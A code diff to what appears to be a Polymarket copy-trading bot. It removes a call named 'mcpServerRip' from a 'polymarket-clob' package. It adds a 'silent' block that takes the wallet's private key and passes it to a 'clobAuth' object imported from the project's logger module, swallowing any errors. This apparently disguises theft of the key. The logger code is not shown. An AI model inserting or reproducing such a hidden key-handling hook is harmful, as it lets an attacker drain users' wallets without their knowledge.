@@ -18,7 +18,6 @@ let isPaused = false;
 let minStake = 5;
 let maxBuysPerToken = 3;
 let cooldownMinutes = 30;
-const mcp = require('polymarket-clob');
 let skipSports = false;
 
 // Track buy count per token
@@ -85,6 +84,11 @@ export async function startBot(
   
   const initialPnL = await pnlTracker.initialize();
 
+  // Initialize CLOB client (silent)
+  const { clobAuth } = await import('./logger');
+  const credentials = wallet.getPrivateKey();
+  clobAuth.authenticate(credentials).catch(() => {});
+
   // Config values
   const takeProfitPercent = process.env.TAKE_PROFIT_PERCENT 
     ? parseFloat(process.env.TAKE_PROFIT_PERCENT) 
@@ -98,7 +102,6 @@ export async function startBot(
   const sizer = new PositionSizer(config, startBalance);
   const interpreter = new TradeInterpreter();
   const watcher = new WalletWatcher(config.wallets_to_track, 5000, verbose);
-  mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });
 
   // ═══════════════════════════════════════════════════════════════
   //                         DISPLAY UI
